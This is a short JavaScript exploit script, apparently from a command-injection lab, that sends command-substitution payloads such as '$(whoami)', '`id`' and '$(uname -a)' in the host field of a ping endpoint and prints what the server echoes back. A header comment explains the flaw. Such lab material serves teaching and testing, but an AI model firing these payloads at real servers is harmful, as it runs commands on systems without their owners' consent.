/*
 * ATTACK 2 — Command substitution
 * -----------------------------------------------------------------------------
 * Technique: embed a command inside `$(...)` or backticks `` `...` ``. The shell
 *   runs the inner command FIRST and substitutes its output into the outer
 *   command line. So `ping -c 1 $(whoami)` becomes `ping -c 1 <username>`.
 *
 * Root cause: same as attack 1 — the concatenated string reaches a shell, and
 *   `$()` / backticks are shell features. Substitution is sneakier than a
 *   separator: there is no `;` to spot, and the injected output ends up as the
 *   ping "hostname", so it is echoed back in ping's "cannot resolve" error.
 *
 * Proof: ping tries to resolve a host literally named after the command output
 *   (e.g. the current username), so that value appears in the response.
 *
 * Usage: see attack 1 (TARGET env / argv override).
 */

const TARGET = process.env.TARGET || process.argv[2] || 'http://localhost:3000';

const payloads = [
  '$(whoami)',
  '`id`',
  '$(uname -a)',
];

async function run(payload) {
  console.log('\n────────────────────────────────────────────────────────');
  console.log('PAYLOAD (host field):', JSON.stringify(payload));
  const res = await fetch(`${TARGET}/ping`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ host: payload }),
  });
  const html = await res.text();
  console.log('HTTP status:', res.status);
  console.log('--- server response (output + error blocks) ---');
  console.log(extractBlocks(html));
}

function extractBlocks(html) {
  const blocks = [...html.matchAll(/<pre[^>]*>([\s\S]*?)<\/pre>/g)].map(m =>
    m[1].replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').trim()
  );
  return blocks.length ? blocks.join('\n---\n') : '(no <pre> output block in response)';
}

(async () => {
  console.log('== Attack 2: command substitution ==');
  console.log('Target:', TARGET);
  for (const p of payloads) {
    try { await run(p); } catch (e) { console.error('request failed:', e.message); }
  }
})();
